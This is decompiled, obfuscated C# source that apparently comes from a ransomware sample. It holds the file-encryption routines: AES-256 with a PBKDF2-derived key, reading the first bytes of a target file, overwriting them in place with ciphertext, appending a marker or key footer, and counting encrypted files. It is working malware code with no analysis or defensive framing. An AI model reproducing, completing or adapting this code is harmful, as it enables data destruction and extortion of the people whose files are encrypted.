using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

public static class VbJxNITbKqkCPhG
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] QTulHfZYmae(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = UuptqOKDDpZ(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes UuptqOKDDpZ(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] KlRCrLIVmNrA(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (cQHVlxVivZVq.RrpEvBQBLONZKo == getString_0(107396868))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (cQHVlxVivZVq.SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(cQHVlxVivZVq.bDDJFCkjBbYQ, getString_0(107399078) + string_0 + getString_0(107379414) + ex.Message + getString_0(107395976));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool ilkRJUapRp(string THVIvWtEdHnQ, byte[] tRlxUGmSHDq, byte[] UjxCrHgnMeLgc = null)
	{
		try
		{
			byte[] array = null;
			if (cQHVlxVivZVq.RrpEvBQBLONZKo == getString_0(107396868))
			{
				array = (cQHVlxVivZVq.UpNccIaFzBadyA ? Encoding.ASCII.GetBytes(cQHVlxVivZVq.sNXkawcfFmeqKOWI(cQHVlxVivZVq.ueuvoVAMScuH) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379868)) + Convert.ToString(cQHVlxVivZVq.bQealBkUmzhp) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379868))) : Encoding.ASCII.GetBytes(cQHVlxVivZVq.sNXkawcfFmeqKOWI(cQHVlxVivZVq.ueuvoVAMScuH) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379845)) + Convert.ToString(cQHVlxVivZVq.bQealBkUmzhp) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379845))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(THVIvWtEdHnQ, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(tRlxUGmSHDq, 0, tRlxUGmSHDq.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(THVIvWtEdHnQ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!cQHVlxVivZVq.UpNccIaFzBadyA)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(UjxCrHgnMeLgc, 0, UjxCrHgnMeLgc.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (cQHVlxVivZVq.UpNccIaFzBadyA ? Encoding.ASCII.GetBytes(cQHVlxVivZVq.sNXkawcfFmeqKOWI(cQHVlxVivZVq.ueuvoVAMScuH) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379868)) + Convert.ToString(cQHVlxVivZVq.bQealBkUmzhp) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379868))) : Encoding.ASCII.GetBytes(cQHVlxVivZVq.sNXkawcfFmeqKOWI(cQHVlxVivZVq.ueuvoVAMScuH) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379845)) + Convert.ToString(cQHVlxVivZVq.bQealBkUmzhp) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379845))));
				FileStream fileStream2 = new FileStream(THVIvWtEdHnQ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(tRlxUGmSHDq, 0, tRlxUGmSHDq.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(THVIvWtEdHnQ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!cQHVlxVivZVq.UpNccIaFzBadyA)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(UjxCrHgnMeLgc, 0, UjxCrHgnMeLgc.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			cQHVlxVivZVq.DPjjDEUnrYJ++;
		}
		catch (Exception ex)
		{
			if (cQHVlxVivZVq.SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(cQHVlxVivZVq.bDDJFCkjBbYQ, getString_0(107399078) + THVIvWtEdHnQ + getString_0(107379827) + ex.Message + getString_0(107395976));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (cQHVlxVivZVq.UpNccIaFzBadyA ? Encoding.ASCII.GetBytes(cQHVlxVivZVq.sNXkawcfFmeqKOWI(cQHVlxVivZVq.ueuvoVAMScuH) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379868)) + Convert.ToString(cQHVlxVivZVq.bQealBkUmzhp) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379868))) : Encoding.ASCII.GetBytes(cQHVlxVivZVq.sNXkawcfFmeqKOWI(cQHVlxVivZVq.ueuvoVAMScuH) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379845)) + Convert.ToString(cQHVlxVivZVq.bQealBkUmzhp) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379845))));
				FileStream fileStream4 = new FileStream(THVIvWtEdHnQ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(tRlxUGmSHDq, 0, tRlxUGmSHDq.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(THVIvWtEdHnQ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!cQHVlxVivZVq.UpNccIaFzBadyA)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(UjxCrHgnMeLgc, 0, UjxCrHgnMeLgc.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static VbJxNITbKqkCPhG()
	{
		Strings.CreateGetStringDelegate(typeof(VbJxNITbKqkCPhG));
	}
}
